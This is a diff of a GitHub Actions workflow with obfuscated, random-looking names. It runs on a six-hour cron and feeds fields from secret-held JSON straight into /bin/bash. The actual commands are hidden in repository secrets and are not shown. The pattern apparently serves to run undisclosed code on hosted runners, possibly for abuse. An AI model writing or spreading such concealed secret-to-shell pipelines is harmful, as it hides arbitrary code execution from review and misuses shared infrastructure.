@@ -1,9 +1,11 @@
 name: yuxuhuanga
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 1/6 * * *'
-jobs:  # 26363
+    - cron: '48 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,21 +13,22 @@ jobs:  # 26363
       - uses: actions/checkout@v4
       - name: yuxuhuanga
         env:
-          htou1526: ${{ secrets.htou1526 }}
+          gcxl0: ${{ secrets.gcxl0 }}
         run: |
-          echo $htou1526 | jq -r .flu3 | /bin/bash
-          echo $gv0851 | jq -r .bfci86 | /bin/bash
-          echo $abhit09226 | jq -r .uliqw435 | /bin/bash
-          echo $tbhps28152 | jq -r .i45 | /bin/bash
-          echo $w17 | jq -r .qcdsv40230 | /bin/bash
-          echo $mn4113 | jq -r .o5 | /bin/bash
-          echo $rn8 | jq -r .riylb9 | /bin/bash
-          echo $jm7 | jq -r .vffkn7944 | /bin/bash
-          echo $rvnfr06 | jq -r .ouas9317 | /bin/bash
-          echo $mw6 | jq -r .q297 | /bin/bash
-          echo $arpi365 | jq -r .rvg4 | /bin/bash
-          echo $xgepf97720 | jq -r .cp5 | /bin/bash
-          echo $u44 | jq -r .zes512 | /bin/bash
-          echo $lfp4 | jq -r .ye53813 | /bin/bash
-          echo $d3247 | jq -r .sepv181 | /bin/bash
+          echo $gcxl0 | jq -r .p6680 | /bin/bash
+          echo $llk6 | jq -r .pz49 | /bin/bash
+          echo $tlrcj9 | jq -r .xr7987 | /bin/bash
+          echo $c30 | jq -r .zkrr6892 | /bin/bash
+          echo $okjyg2 | jq -r .s325 | /bin/bash
+          echo $dezk255 | jq -r .nwc15276 | /bin/bash
+          echo $aqd51376 | jq -r .alti5 | /bin/bash
+          echo $etjel9 | jq -r .hb68939 | /bin/bash
+          echo $ixgxq0591 | jq -r .rutly849 | /bin/bash
+          echo $qn1701 | jq -r .iz46413 | /bin/bash
+          echo $uxgdj2314 | jq -r .j6 | /bin/bash
+          echo $e7 | jq -r .iqayn84049 | /bin/bash
+          echo $m17567 | jq -r .puh0 | /bin/bash
+          echo $b509 | jq -r .e38859 | /bin/bash
+          echo $m93586 | jq -r .cc9921 | /bin/bash
+          echo $upr3 | jq -r .hi6244 | /bin/bash
 
